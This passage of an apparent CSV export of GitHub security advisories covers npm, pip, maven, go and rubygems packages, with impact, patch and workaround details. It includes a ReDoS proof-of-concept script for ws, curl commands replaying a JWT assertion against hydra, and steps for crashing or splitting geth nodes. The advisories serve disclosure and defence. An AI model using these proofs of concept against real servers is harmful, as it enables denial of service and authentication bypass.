* [This answer on StackExchange](https://security.stackexchange.com/questions/157528/ways-to-bypass-browsers-cors-policy/157531#157531)
* [OWASP CSRF](https://owasp.org/www-community/attacks/csrf)
* Fixed in PR [#2118](https://github.com/tiangolo/fastapi/pull/2118)

### For more information

If you have any questions or comments, write to [security@tiangolo.com](mailto:security@tiangolo.com)",pip
136,16044,ws,GHSA-6fc8-4gx4-v693,CVE-2021-32640,https://github.com/advisories/GHSA-6fc8-4gx4-v693,moderate,2021-05-28 19:19:03 UTC,ReDoS in Sec-Websocket-Protocol header,"### Impact

A specially crafted value of the `Sec-Websocket-Protocol` header can be used to significantly slow down a ws server.

### Proof of concept

```js
for (const length of [1000, 2000, 4000, 8000, 16000, 32000]) {
  const value = 'b' + ' '.repeat(length) + 'x';
  const start = process.hrtime.bigint();

  value.trim().split(/ *, */);

  const end = process.hrtime.bigint();

  console.log('length = %d, time = %f ns', length, end - start);
}
```

### Patches

The vulnerability was fixed in ws@7.4.6 (https://github.com/websockets/ws/commit/00c425ec77993773d823f018f64a5c44e17023ff) and backported to ws@6.2.2 (https://github.com/websockets/ws/commit/78c676d2a1acefbc05292e9f7ea0a9457704bf1b) and ws@5.2.3 (https://github.com/websockets/ws/commit/76d47c1479002022a3e4357b3c9f0e23a68d4cd2).

### Workarounds

In vulnerable versions of ws, the issue can be mitigated by reducing the maximum allowed length of the request headers using the [`--max-http-header-size=size`](https://nodejs.org/api/cli.html#cli_max_http_header_size_size) and/or the [`maxHeaderSize`](https://nodejs.org/api/http.html#http_http_createserver_options_requestlistener) options.

### Credits

The vulnerability was responsibly disclosed along with a fix in private by [Robert McLaughlin](https://github.com/robmcl4) from University of California, Santa Barbara.
",npm
137,30537,Zope,GHSA-rpcg-f9q6-2mq6,,https://github.com/advisories/GHSA-rpcg-f9q6-2mq6,high,2021-06-08 18:45:52 UTC,Remote Code Execution via traversal in TAL expressions,"This advisory extends the previous advisory at https://github.com/zopefoundation/Zope/security/advisories/GHSA-5pr9-v234-jw36 with additional cases of TAL expression traversal vulnerabilities.

### Impact
Most Python modules are not available for using in TAL expressions that you can add through-the-web, for example in Zope Page Templates. This restriction avoids file system access, for example via the 'os' module. But some of the untrusted modules are available indirectly through Python modules that are available for direct use.

By default, you need to have the Manager role to add or edit Zope Page Templates through the web. Only sites that allow untrusted users to add/edit Zope Page Templates through the web are at risk.

### Patches
The problem has been fixed in Zope 5.21 and 4.6.1.

### Workarounds
The workaround is the same as for https://github.com/zopefoundation/Zope/security/advisories/GHSA-5pr9-v234-jw36: A site administrator can restrict adding/editing Zope Page Templates through the web using the standard Zope user/role permission mechanisms. Untrusted users should not be assigned the Zope Manager role and adding/editing Zope Page Templates through the web should be restricted to trusted users only.

### References
* [The previous advisory (GHSA-5pr9-v234-jw36)](https://github.com/zopefoundation/Zope/security/advisories/GHSA-5pr9-v234-jw36)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in the [Zope issue tracker](https://github.com/zopefoundation/Zope/issues)
* Email us at [security@plone.org](mailto:security@plone.org)
",pip
138,15918,minimist,GHSA-7fhm-mqm4-2wp7,,https://github.com/advisories/GHSA-7fhm-mqm4-2wp7,moderate,2020-03-13 20:36:16 UTC,Withdrawn: ESLint dependencies are vulnerable (ReDoS and Prototype Pollution),"**Withdrawn**
GitHub has withdrawn this advisory in place of GHSA-vh95-rmgr-6w4m and GHSA-6chw-6frg-f759.
The reason for withdrawing is that some mistakes were made during the ingestion of CVE-2020-7598
which caused this advisory to be published with incorrect information.

In order to provide accurate advisory information, new advisories were created:

- minimist: https://github.com/advisories/GHSA-vh95-rmgr-6w4m
- acorn: https://github.com/advisories/GHSA-6chw-6frg-f759",npm
139,29107,datasette,GHSA-xw7c-jx9m-xh5g,,https://github.com/advisories/GHSA-xw7c-jx9m-xh5g,high,2021-06-07 21:47:41 UTC,Reflected cross-site scripting issue in Datasette,"### Impact

The `?_trace=1` debugging feature in Datasette does not correctly escape generated HTML, resulting in a [reflected cross-site scripting](https://owasp.org/www-community/attacks/xss/#reflected-xss-attacks) vulnerability.

This vulnerability is particularly relevant if your Datasette installation includes authenticated features using plugins such as [datasette-auth-passwords](https://datasette.io/plugins/datasette-auth-passwords) as an attacker could use the vulnerability to access protected data.

### Patches

Datasette 0.57 and 0.56.1 both include patches for this issue.

### Workarounds

If you run Datasette behind a proxy you can workaround this issue by rejecting any incoming requests with `?_trace=` or `&_trace=` in their query string parameters.

### References

- [OWASP guide to reflected cross-site scripting](https://owasp.org/www-community/attacks/xss/#reflected-xss-attacks)
- [Datasette issue #1360](https://github.com/simonw/datasette/issues/1360)

### For more information
If you have any questions or comments about this advisory:
* Open a discussion in [simonw/datasette](https://github.com/simonw/datasette/discussions)
* Email us at `swillison+datasette @ gmail.com`
",pip
140,33873,ch.qos.logback:logback-classic,GHSA-vmfg-rjjm-rjrj,CVE-2017-5929,https://github.com/advisories/GHSA-vmfg-rjjm-rjrj,critical,2021-06-07 16:07:36 UTC,Deserialization of Untrusted Data,"QOS.ch Logback before 1.2.0 has a serialization vulnerability affecting the SocketServer and ServerSocketReceiver components. The RemoteStreamAppenderClient class in logback-classic and the SocketNode classes in logback-classic and logback-access allow data to be deserialized over a Java Socket, via an ObjectInputStream, without validating the data beforehand. When data is received from the Socket, to be logged, it is deserialized into Java objects.An attacker can exploit this vulnerability by sending malicious, serialized Java objects over the connection to the Socket, which may result in execution of arbitrary code when those objects are deserialized. Note that although logback-core is implicated by the Logback project here, the Sonatype Security Research team discovered that the vulnerability is actually present in the logback-classic and logback-access components. Versions prior to 1.2.0 are vulnerable, as stated in the advisory.",maven
141,35023,org.hibernate.validator:hibernate-validator,GHSA-rmrm-75hp-phr2,CVE-2020-10693,https://github.com/advisories/GHSA-rmrm-75hp-phr2,moderate,2021-06-04 21:36:34 UTC,Improper Input Validation in Hibernate Validator,"A flaw was found in Hibernate Validator version 6.1.2.Final. A bug in the message interpolation processor enables invalid EL expressions to be evaluated as if they were valid. This flaw allows attackers to bypass input sanitation (escaping, stripping) controls that developers may have put in place when handling user-controlled data in error messages.",maven
142,34007,org.yaml:snakeyaml,GHSA-rvwf-54qp-4r6v,CVE-2017-18640,https://github.com/advisories/GHSA-rvwf-54qp-4r6v,high,2021-06-04 21:37:45 UTC,SnakeYAML Entity Expansion during load operation,"The Alias feature in SnakeYAML 1.18 allows entity expansion during a load operation, a related issue to CVE-2003-1564.",maven
143,22634,vault,GHSA-38j9-7pp9-2hjw,CVE-2021-32923,https://github.com/advisories/GHSA-38j9-7pp9-2hjw,high,2021-06-08 18:52:05 UTC,Invalid session token expiration,"HashiCorp Vault and Vault Enterprise allowed the renewal of nearly-expired token leases and dynamic secret leases (specifically, those within 1 second of their maximum TTL), which caused them to be incorrectly treated as non-expiring during subsequent use. Fixed in 1.5.9, 1.6.5, and 1.7.2.",go
144,33885,org.apache.httpcomponents:httpclient,GHSA-7r82-7xv7-xcpj,CVE-2020-13956,https://github.com/advisories/GHSA-7r82-7xv7-xcpj,moderate,2021-06-03 23:40:23 UTC,Cross-site scripting in Apache HttpClient,Apache HttpClient versions prior to version 4.5.13 and 5.0.3 can misinterpret malformed authority component in request URIs passed to the library as java.net.URI object and pick the wrong target host for request execution.,maven
145,34676,org.jboss.resteasy:resteasy-client,GHSA-hr32-mgpm-qf2f,CVE-2020-25633,https://github.com/advisories/GHSA-hr32-mgpm-qf2f,moderate,2021-06-03 23:41:34 UTC,Generation of Error Message Containing Sensitive Information in RESTEasy client,A flaw was found in RESTEasy client in all versions of RESTEasy up to 4.5.6.Final. It may allow client users to obtain the server's potentially sensitive information when the server got WebApplicationException from the RESTEasy client call. The highest threat from this vulnerability is to data confidentiality.,maven
146,19844,Pillow,GHSA-7r7m-5h27-29hp,CVE-2021-28676,https://github.com/advisories/GHSA-7r7m-5h27-29hp,high,2021-06-08 18:48:53 UTC,Potential infinite loop in Pillow,"An issue was discovered in Pillow before 8.2.0. For FLI data, FliDecode did not properly check that the block advance was non-zero, potentially leading to an infinite loop on load.",pip
147,19844,Pillow,GHSA-77gc-v2xv-rvvh,CVE-2021-25287,https://github.com/advisories/GHSA-77gc-v2xv-rvvh,critical,2021-06-08 18:49:02 UTC,Out-of-bounds Read in Pillow,"An issue was discovered in Pillow before 8.2.0. There is an out-of-bounds read in J2kDecode, in j2ku_graya_la.",pip
148,19844,Pillow,GHSA-g6rj-rv7j-xwp4,CVE-2021-28675,https://github.com/advisories/GHSA-g6rj-rv7j-xwp4,moderate,2021-06-08 18:49:11 UTC,Denial of service,An issue was discovered in Pillow before 8.2.0. PSDImagePlugin.PsdImageFile lacked a sanity check on the number of input layers relative to the size of the data block. This could lead to a DoS on Image.open prior to Image.load.,pip
149,19844,Pillow,GHSA-hjfx-8p6c-g7gx,CVE-2021-28678,https://github.com/advisories/GHSA-hjfx-8p6c-g7gx,moderate,2021-06-08 18:49:20 UTC,Insufficient Verification of Data Authenticity in Pillow,"An issue was discovered in Pillow before 8.2.0. For BLP data, BlpImagePlugin did not properly check that reads (after jumping to file offsets) returned data. This could lead to a DoS where the decoder could be run a large number of times on empty data.",pip
150,19844,Pillow,GHSA-rwv7-3v45-hg29,CVE-2021-25288,https://github.com/advisories/GHSA-rwv7-3v45-hg29,critical,2021-06-08 18:49:28 UTC,Out-of-bounds Read,"An issue was discovered in Pillow before 8.2.0. There is an out-of-bounds read in J2kDecode, in j2ku_gray_i. This dates to Pillow 2.4.0.",pip
151,19844,Pillow,GHSA-q5hq-fp76-qmrc,CVE-2021-28677,https://github.com/advisories/GHSA-q5hq-fp76-qmrc,high,2021-06-08 18:49:36 UTC,Uncontrolled Resource Consumption in Pillow,"An issue was discovered in Pillow before 8.2.0. For EPS data, the readline implementation used in EPSImageFile has to deal with any combination of \r and \n as line endings. It used an accidentally quadratic method of accumulating lines while looking for a line ending. A malicious EPS file could use this to perform a DoS of Pillow in the open phase, before an image was accepted for opening.",pip
152,35986,org.jboss.xnio:xnio-nio,GHSA-c738-77x8-wmq5,CVE-2020-14340,https://github.com/advisories/GHSA-c738-77x8-wmq5,moderate,2021-06-08 22:29:29 UTC,Uncontrolled Resource Consumption in XNIO,A vulnerability was discovered in XNIO where file descriptor leak caused by growing amounts of NIO Selector file handles between garbage collection cycles. It may allow the attacker to cause a denial of service. It affects XNIO versions 3.6.0.Beta1 through 3.8.1.Final.,maven
153,35264,org.primefaces:primefaces,GHSA-j239-4gqg-5j54,CVE-2017-1000486,https://github.com/advisories/GHSA-j239-4gqg-5j54,critical,2021-06-03 19:22:22 UTC,Inadequate Encryption Strength,Primetek Primefaces 5.x is vulnerable to a weak encryption flaw resulting in remote code execution,maven
154,20092,ansible,GHSA-8f4m-hccc-8qph,CVE-2021-20191,https://github.com/advisories/GHSA-8f4m-hccc-8qph,moderate,2021-06-01 21:38:33 UTC,Insertion of Sensitive Information into Log File in ansible,"A flaw was found in ansible. Credentials, such as secrets, are being disclosed in console log by default and not protected by no_log feature when using those modules. An attacker can take advantage of this information to steal those credentials. The highest threat from this vulnerability is to data confidentiality.",pip
155,20092,ansible,GHSA-wv5p-gmmv-wh9v,CVE-2021-20178,https://github.com/advisories/GHSA-wv5p-gmmv-wh9v,moderate,2021-06-01 21:53:29 UTC,Insertion of Sensitive Information into Log File in ansible,A flaw was found in ansible module where credentials are disclosed in the console log by default and not protected by the security feature when using the bitbucket_pipeline_variable module. This flaw allows an attacker to steal bitbucket_pipeline credentials. The highest threat from this vulnerability is to confidentiality.,pip
156,20092,ansible,GHSA-r6h7-5pq2-j77h,CVE-2020-10729,https://github.com/advisories/GHSA-r6h7-5pq2-j77h,moderate,2021-06-15 16:10:11 UTC,Insufficiently random values in Ansible,A flaw was found in the use of insufficiently random values in Ansible. Two random password lookups of the same length generate the equal value as the template caching action for the same file since no re-evaluation happens. The highest threat from this vulnerability would be that all passwords are exposed at once for the file. This flaw affects Ansible Engine versions before 2.9.6.,pip
157,35825,org.keycloak:keycloak-core,GHSA-q6w2-89hq-hq27,CVE-2021-20195,https://github.com/advisories/GHSA-q6w2-89hq-hq27,critical,2021-06-08 23:02:43 UTC,keycloak Self Stored Cross-site Scripting vulnerability,A flaw was found in keycloak in versions before 13.0.0. A Self Stored XSS attack vector escalating to a complete account takeover is possible due to user-supplied data fields not being properly encoded and Javascript code being used to process the data. The highest threat from this vulnerability is to data confidentiality and integrity as well as system availability.,maven
158,19312,dragonfly,GHSA-j858-xp5v-f8xx,CVE-2021-33564,https://github.com/advisories/GHSA-j858-xp5v-f8xx,critical,2021-06-02 21:42:49 UTC,Remote code execution in Dragonfly,An argument injection vulnerability in the Dragonfly gem before 1.4.0 for Ruby allows remote attackers to read and write to arbitrary files via a crafted URL when the verify_url option is disabled. This may lead to code execution. The problem occurs because the generate and process features mishandle use of the ImageMagick convert utility.,rubygems
159,19842,urllib3,GHSA-q2q7-5pp4-w6pg,CVE-2021-33503,https://github.com/advisories/GHSA-q2q7-5pp4-w6pg,high,2021-06-01 21:19:32 UTC,Catastrophic backtracking in URL authority parser when passed URL containing many @ characters,"### Impact

When provided with a URL containing many `@` characters in the authority component the authority regular expression exhibits catastrophic backtracking causing a denial of service if a URL were passed as a parameter or redirected to via an HTTP redirect.


### Patches

The issue has been fixed in urllib3 v1.26.5.

### References

- [CVE-2021-33503](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33503)
- [JVNVU#92413403 (English)](https://jvn.jp/en/vu/JVNVU92413403/)
- [JVNVU#92413403 (Japanese)](https://jvn.jp/vu/JVNVU92413403/)
- [urllib3 v1.26.5](https://github.com/urllib3/urllib3/releases/tag/1.26.5)

### For more information
If you have any questions or comments about this advisory:
* Ask in our [community Discord](https://discord.gg/urllib3)
* Email [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com)
",pip
160,20276,Plone,GHSA-fj67-w3m4-rfmp,CVE-2021-33513,https://github.com/advisories/GHSA-fj67-w3m4-rfmp,moderate,2021-06-08 23:19:28 UTC,Cross-site scripting in Plone,Plone through 5.2.4 allows XSS via the inline_diff methods in Products.CMFDiffTool.,pip
161,20276,Plone,GHSA-hm2h-f456-6j88,CVE-2021-33512,https://github.com/advisories/GHSA-hm2h-f456-6j88,moderate,2021-06-08 23:20:04 UTC,Cross-site scripting in Plone,Plone through 5.2.4 allows stored XSS attacks (by a Contributor) by uploading an SVG or HTML document.,pip
162,20276,Plone,GHSA-rmpv-rcp6-v8wc,CVE-2021-33508,https://github.com/advisories/GHSA-rmpv-rcp6-v8wc,moderate,2021-06-08 23:20:11 UTC,Cross-site scripting in Plone,Plone through 5.2.4 allows XSS via a full name that is mishandled during rendering of the ownership tab of a content item.,pip
163,20452,Products.CMFCore,GHSA-35rg-466w-77h3,CVE-2021-33507,https://github.com/advisories/GHSA-35rg-466w-77h3,moderate,2021-06-18 18:44:50 UTC,"Cross-site scripting in Products.CMFCore, Products.PluggableAuthService, Plone","Zope Products.CMFCore before 2.5.1 and Products.PluggableAuthService before 2.6.2, as used in Plone through 5.2.4 and other products, allow Reflected XSS.",pip
164,20276,Plone,GHSA-gc9g-67cq-p7v4,CVE-2021-33511,https://github.com/advisories/GHSA-gc9g-67cq-p7v4,high,2021-06-15 16:12:04 UTC,Server-Side Request Forgery in Plone,"Plone though 5.2.4 allows SSRF via the lxml parser. This affects Diazo themes, Dexterity TTW schemas, and modeleditors in plone.app.theming, plone.app.dexterity, and plone.supermodel.",pip
165,20276,Plone,GHSA-4mg4-wvmx-5332,CVE-2021-33510,https://github.com/advisories/GHSA-4mg4-wvmx-5332,moderate,2021-06-15 16:11:47 UTC,Server-Side Request Forgery in Plone,"Plone through 5.2.4 allows remote authenticated managers to conduct SSRF attacks via an event ical URL, to read one line of a file.",pip
166,20276,Plone,GHSA-hm2p-fhwx-9285,CVE-2021-33509,https://github.com/advisories/GHSA-hm2p-fhwx-9285,critical,2021-06-15 16:11:38 UTC,Incorrect Permission Assignment for Critical Resource	in Plone,Plone through 5.2.4 allows remote authenticated managers to perform disk I/O via crafted keyword arguments to the ReStructuredText transform in a Python script.,pip
167,18135,tinymce,GHSA-5vm8-hhgr-jcjp,,https://github.com/advisories/GHSA-5vm8-hhgr-jcjp,moderate,2021-05-28 19:18:53 UTC,Cross-site scripting vulnerability in TinyMCE,"### Impact
A cross-site scripting (XSS) vulnerability was discovered in the URL sanitization logic of the core parser for `form` elements. The vulnerability allowed arbitrary JavaScript execution when inserting a specially crafted piece of content into the editor using the clipboard or APIs, and then submitting the form. However, as TinyMCE does not allow forms to be submitted while editing, the vulnerability could only be triggered when the content was previewed or rendered outside of the editor. This impacts all users who are using TinyMCE 5.7.0 or lower.

### Patches
This vulnerability has been patched in TinyMCE 5.7.1 by improved URL sanitization logic.

### Workarounds
To work around this vulnerability, either:
- Upgrade to TinyMCE 5.7.1 or higher
- Manually sanitize `form` URL attributes using a [TinyMCE node filter](https://www.tiny.cloud/docs/api/tinymce.html/tinymce.html.domparser/#addnodefilter).
- Disable `form` elements in your content using the [invalid_elements](https://www.tiny.cloud/docs/configure/content-filtering/#invalid_elements) setting.

#### Example: Sanitizing using a node filter
```js
editor.parser.addNodeFilter('form', function(nodes) {
  nodes.forEach(function(node) {
    if (node.attributes) {
      node.attributes.forEach(function(attr) {
        var name = attr.name;
        var value = attr.value;
        // Sanitize the attribute value here or remove it entirely
        var sanitizedValue = ...;
        node.attr(name, santizedValue);
      });
    }
  });
});
```

#### Example: Using invalid_elements
```js
invalid_elements: 'form'
```

### Acknowledgements
Tiny Technologies would like to thank Mikhail Khramenkov at Solar Security Research Team for discovering this vulnerability.

### References
https://www.tiny.cloud/docs/release-notes/release-notes571/#securityfixes

### For more information
If you have any questions or comments about this advisory:
* Open an issue in the [TinyMCE repo](https://github.com/tinymce/tinymce/issues)
* Email us at [infosec@tiny.cloud](mailto:infosec@tiny.cloud)",npm
168,30537,Zope,GHSA-962m-m8jw-8wrr,CVE-2021-32633,https://github.com/advisories/GHSA-962m-m8jw-8wrr,high,2021-06-15 16:10:49 UTC,Path Traversal in Zope,"Zope is an open-source web application server. In Zope versions prior to 4.6 and 5.2, users can access untrusted modules indirectly through Python modules that are available for direct use. By default, only users with the Manager role can add or edit Zope Page Templates through the web, but sites that allow untrusted users to add/edit Zope Page Templates through the web are at risk from this vulnerability. The problem has been fixed in Zope 5.2 and 4.6. As a workaround, a site administrator can restrict adding/editing Zope Page Templates through the web using the standard Zope user/role permission mechanisms. Untrusted users should not be assigned the Zope Manager role and adding/editing Zope Page Templates through the web should be restricted to trusted users only.",pip
169,18813,bundler,GHSA-fp4w-jxhp-m23p,CVE-2020-36327,https://github.com/advisories/GHSA-fp4w-jxhp-m23p,high,2021-05-24 18:12:33 UTC,Dependency Confusion in Bundler,"Bundler 1.16.0 through 2.2.9 and 2.2.11 through 2.2.17 sometimes chooses a dependency source based on the highest gem version number, which means that a rogue gem found at a public source may be chosen, even if the intended choice was a private gem that is a dependency of another private gem that is explicitly depended on by the application.",rubygems
170,28945,Flask-AppBuilder,GHSA-434h-p4gx-jm89,CVE-2021-29621,https://github.com/advisories/GHSA-434h-p4gx-jm89,moderate,2021-05-27 18:38:36 UTC,Observable Response Discrepancy in Flask-AppBuilder,"### Impact
User enumeration in database authentication in Flask-AppBuilder <= 3.2.3. Allows for a non authenticated user to enumerate existing accounts by timing the response time from the server when you are logging in.

### Patches
Upgrade to 3.3.0

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [Flask-AppBuilder](https://github.com/dpgaspar/Flask-AppBuilder)

",pip
171,22395,runc/libcontainer,GHSA-fh74-hm69-rqjw,CVE-2019-19921,https://github.com/advisories/GHSA-fh74-hm69-rqjw,moderate,2021-05-27 18:41:17 UTC,procfs race condition with a shared volume mount,"### Impact
By crafting a malicious root filesystem (with `/proc` being a symlink to a directory which was inside a volume shared with another running container), an attacker in control of both containers can trick `runc` into not correctly configuring the container&amp;amp;amp;amp;#39;s security labels and not correctly masking paths inside `/proc` which contain potentially-sensitive information about the host (or even allow for direct attacks against the host).

In order to exploit this bug, an untrusted user must be able to spawn custom containers with custom mount configurations (such that a volume is shared between two containers). It should be noted that we consider this to be a fairly high level of access for an untrusted user -- and we do not recommend allowing completely untrusted users to have such degrees of access without further restrictions.

### Patches
This vulnerability has been fixed in `1.0.0-rc10`. It should be noted that the current fix is effectively a hot-fix, and there are known ways for it to be worked around (such as making the entire root filesystem a shared volume controlled by another container). We recommend that users review their access policies to ensure that untrusted users do not have such high levels of controls over container mount configuration.

### Workarounds
If you are not providing the ability for untrusted users to configure mountpoints for `runc` (or through a higher-level tool such as `docker run -v`) then you are not vulnerable to this issue. This exploit requires fairly complicated levels of access (which are available for some public clouds but are not necessarily available for all deployments).

Additionally, it appears as though it is not possible to exploit this vulnerability through Docker (due to the order of mounts Docker generates). However you should not depend on this, as it may be possible to work around this roadblock.

### Credits
This vulnerability was discovered by Cure53, as part of a third-party security audit.

### For more information
If you have any questions or comments about this advisory:
* [Open an issue](https://github.com/opencontainers/runc/issues/new).
* Email us at [dev@opencontainers.org](mailto:dev@opencontainers.org), or [security@opencontainers.org](mailto:security@opencontainers.org) if you think you&amp;amp;amp;amp;#39;ve found a security bug.",go
172,32454,hydra,GHSA-3p3g-vpw6-4w66,CVE-2020-5300,https://github.com/advisories/GHSA-3p3g-vpw6-4w66,moderate,2021-05-27 18:43:22 UTC,Authentication Bypass in hydra,"### Impact

""When using client authentication method ""private_key_jwt"" [1], OpenId specification says the following about assertion `jti`:""

> A unique identifier for the token, which can be used to prevent reuse of the token. These tokens MUST only be used once, unless conditions for reuse were negotiated between the parties

""Hydra does not seem to check the uniqueness of this `jti` value. Here is me sending the same token request twice, hence with the same `jti` assertion, and getting two access tokens:""

  ```
$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \
   --header 'Content-Type: application/x-www-form-urlencoded' \
   --data-urlencode 'grant_type=client_credentials' \
   --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \
   --data-urlencode 'scope=application openid' \
   --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
   --data-urlencode 'client_assertion=eyJhb [...] jTw'
{""access_token"":""zeG0NoqOtlACl8q5J6A-TIsNegQRRUzqLZaYrQtoBZQ.VR6iUcJQYp3u_j7pwvL7YtPqGhtyQe5OhnBE2KCp5pM"",""expires_in"":3599,""scope"":""application openid"",""token_type"":""bearer""}⏎            ~$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \
   --header 'Content-Type: application/x-www-form-urlencoded' \
   --data-urlencode 'grant_type=client_credentials' \
   --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \
   --data-urlencode 'scope=application openid' \
   --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
   --data-urlencode 'client_assertion=eyJhb [...] jTw'
{""access_token"":""wOYtgCLxLXlELORrwZlmeiqqMQ4kRzV-STU2_Sollas.mwlQGCZWXN7G2IoegUe1P0Vw5iGoKrkOzOaplhMSjm4"",""expires_in"":3599,""scope"":""application openid"",""token_type"":""bearer""}
```


### Severity

""We rate the severity as medium because the following reasons make it hard to replay tokens without the patch:""

- TLS protects against MITM which makes it difficult to intercept valid tokens for replay attacks
- The expiry time of the JWT gives only a short window of opportunity where it could be replayed

### Patches

This will be patched with v1.4.0+oryOS.17

### Workarounds

Two workarounds have been identified:

- Do not allow clients to use `private_key_jwt`
- Use short expiry times for the JWTs

### Upstream

This issue will be resolved in the upstream repository https://github.com/ory/fosite",go
173,23037,xz,GHSA-25xm-hr59-7c27,CVE-2021-29482,https://github.com/advisories/GHSA-25xm-hr59-7c27,high,2021-05-25 18:39:37 UTC,Release v0.5.8 of github.com/ulikunitz/xz fixes readUvarint denial of service,"### Impact

The function readUvarint used to read the xz container format may not terminate a loop provide malicous input.

### Patches

The problem has been fixed in release v0.5.8.

### Workarounds

Limit the size of the compressed file input to a reasonable size for your use case.

### References

The standard library had recently the same issue and got the [CVE-2020-16845](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-16845) allocated.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [xz](https://github.com/ulikunitz/xz/issues).",go
174,32181,goxmldsig,GHSA-q547-gmf8-8jr7,CVE-2020-15216,https://github.com/advisories/GHSA-q547-gmf8-8jr7,moderate,2021-05-24 16:57:32 UTC,Signature Validation Bypass in goxmldsig,"### Impact
With a carefully crafted XML file, an attacker can completely bypass signature validation and pass off an altered file as a signed one. 

### Patches
A patch is available, all users of goxmldsig should upgrade to v1.1.0.

### For more information
If you have any questions or comments about this advisory open an issue at https://github.com/russellhaering/goxmldsig",go
175,32181,goxmldsig,GHSA-rrfw-hg9m-j47h,,https://github.com/advisories/GHSA-rrfw-hg9m-j47h,critical,2021-05-24 16:59:42 UTC,Signature Validation Bypass,"### Impact

An authentication bypass exists in the [goxmldsig](https://github.com/russellhaering/goxmldsig/security/advisories/GHSA-q547-gmf8-8jr7) this library uses to determine if SAML assertions are genuine. An attacker could craft a SAML response that would appear to be valid but would not have been genuinely issued by the IDP.

### Patches

Version 0.4.2 bumps the dependency which should fix the issue.

### For more information

Please see [the advisory in goxmldsig](https://github.com/russellhaering/goxmldsig/security/advisories/GHSA-q547-gmf8-8jr7)

## Credits

The original vulnerability was discovered by @jupenur. Thanks to @russellhaering for the heads up.",go
176,23183,containerd,GHSA-36xw-fx78-c5r4,CVE-2020-15257,https://github.com/advisories/GHSA-36xw-fx78-c5r4,moderate,2021-05-24 17:00:22 UTC,containerd-shim API Exposed to Host Network Containers,"## Impact

Access controls for the shim’s API socket verified that the connecting process had an effective UID of 0, but did not otherwise restrict access to the abstract Unix domain socket. This would allow malicious containers running in the same network namespace as the shim, with an effective UID of 0 but otherwise reduced privileges, to cause new processes to be run with elevated privileges.

## Patches

This vulnerability has been fixed in containerd 1.3.9 and 1.4.3.  Users should update to these versions as soon as they are released.  It should be noted that containers started with an old version of containerd-shim should be stopped and restarted, as running containers will continue to be vulnerable even after an upgrade.

## Workarounds

If you are not providing the ability for untrusted users to start containers in the same network namespace as the shim (typically the ""host"" network namespace, for example with `docker run --net=host` or `hostNetwork: true` in a Kubernetes pod) and run with an effective UID of 0, you are not vulnerable to this issue.

If you are running containers with a vulnerable configuration, you can deny access to all abstract sockets with AppArmor by adding a line similar to `deny unix addr=@**,` to your policy.

It is best practice to run containers with a reduced set of privileges, with a non-zero UID, and with isolated namespaces.  The containerd maintainers strongly advise against sharing namespaces with the host. Reducing the set of isolation mechanisms used for a container necessarily increases that container's privilege, regardless of what container runtime is used for running that container.

## Credits

The containerd maintainers would like to thank Jeff Dileo of NCC Group for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/master/SECURITY.md) and for reviewing the patch.

## For more information

If you have any questions or comments about this advisory:


* [Open an issue](https://github.com/containerd/containerd/issues/new/choose)
* Email us at security@containerd.io if you think you’ve found a security bug.",go
177,22961,go-ethereum,GHSA-v592-xf75-856p,CVE-2020-26240,https://github.com/advisories/GHSA-v592-xf75-856p,moderate,2021-06-29 21:12:56 UTC,Erroneous Proof of Work calculation in geth,"### Impact
An ethash mining DAG generation flaw in Geth could cause miners to erroneously calculate PoW in an upcoming epoch (estimated early January, 2021). This happened on the ETC chain on 2020-11-06. This issue is relevant only for miners, non-mining nodes are unaffected.

### Patches
This issue is also fixed as of 1.9.24. Thanks to @slavikus for bringing the issue to our attention and writing the fix. 

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum)
* Email us at [security@ethereum.org](mailto:security@ethereum.org)",go
178,22961,go-ethereum,GHSA-69v6-xc2j-r2jf,CVE-2020-26241,https://github.com/advisories/GHSA-69v6-xc2j-r2jf,moderate,2021-06-29 21:13:01 UTC,Shallow copy bug in geth,"### Impact
This is a Consensus vulnerability, which can be used to cause a chain-split where vulnerable nodes reject the canonical chain. 

Geth’s pre-compiled `dataCopy` (at `0x00...04`) contract did a shallow copy on invocation. An attacker could deploy a contract that 

- writes `X` to an EVM memory region `R`,
- calls `0x00..04` with `R` as an argument,
- overwrites `R` to `Y`,
- and finally invokes the `RETURNDATACOPY` opcode.

When this contract is invoked, a consensus-compliant node would push `X` on the EVM stack, whereas Geth would push `Y`.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum)
* Email us at [security@ethereum.org](mailto:security@ethereum.org)",go
179,22961,go-ethereum,GHSA-jm5c-rv3w-w83m,CVE-2020-26242,https://github.com/advisories/GHSA-jm5c-rv3w-w83m,moderate,2021-06-29 21:13:20 UTC,Denial of service in geth,"### Impact
Denial-of-service (crash) during block processing

### Details

Affected versions suffer from a vulnerability which can be exploited through the `MULMOD` operation, by specifying a modulo of `0`: `mulmod(a,b,0)`, causing a `panic` in the underlying library. 
The crash was in the `uint256` library, where a buffer [underflowed](https://github.com/holiman/uint256/blob/4ce82e695c10ddad57215bdbeafb68b8c5df2c30/uint256.go#L442).

	if `d == 0`, `dLen` remains `0`

and https://github.com/holiman/uint256/blob/4ce82e695c10ddad57215bdbeafb68b8c5df2c30/uint256.go#L451 will try to access index `[-1]`.

The `uint256` library was first merged in this [commit](https://github.com/ethereum/go-ethereum/commit/cf6674539c589f80031f3371a71c6a80addbe454), on 2020-06-08. 
Exploiting this vulnerabilty would cause all vulnerable nodes to drop off the network. 

The issue was brought to our attention through a [bug report](https://github.com/ethereum/go-ethereum/issues/21367), showing a `panic` occurring on sync from genesis on the Ropsten network.
 
It was estimated that the least obvious way to fix this would be to merge the fix into `uint256`, make a new release of that library and then update the geth-dependency.

- https://github.com/holiman/uint256/releases/tag/v1.1.1 was made the same day, 
